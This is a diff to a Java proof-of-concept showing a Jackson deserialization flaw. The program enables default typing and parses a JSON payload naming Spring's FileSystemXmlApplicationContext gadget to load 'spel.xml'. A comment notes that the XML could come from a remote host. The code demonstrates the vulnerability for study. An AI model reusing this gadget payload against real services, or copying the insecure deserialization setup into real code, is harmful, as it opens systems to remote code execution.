@@ -16,18 +16,21 @@ import com.fasterxml.jackson.databind.ObjectMapper;
 public class App 
 {
 	
-	
-	private static final String JSON_STRING = "{\"id\":123, \"obj\": [\"org.springframework.context.support.FileSystemXmlApplicationContext\", \"spel.xml\"]}";
+
+    //Note: For simplicity, here spel.xml is from local project, but indeed it can come from remote.
+    //That's what irsl's PoC demonstrating.
+   
+    private static final String JSON_STRING = "{\"id\":123, \"obj\": [\"org.springframework.context.support.FileSystemXmlApplicationContext\", \"spel.xml\"]}";
 	
     public static void main( String[] args ) throws JsonParseException, JsonMappingException, IOException
     {
       	System.out.println("creating objectmapper");
-		ObjectMapper objMapper = new ObjectMapper();
+	ObjectMapper objMapper = new ObjectMapper();
 		
-		objMapper.enableDefaultTyping();
+	objMapper.enableDefaultTyping();
 		
-		objMapper.readValue(JSON_STRING.getBytes(), SimpleBean.class);
+	objMapper.readValue(JSON_STRING.getBytes(), SimpleBean.class);
 		
-		System.out.println("done");
+	System.out.println("done");
     }
 }
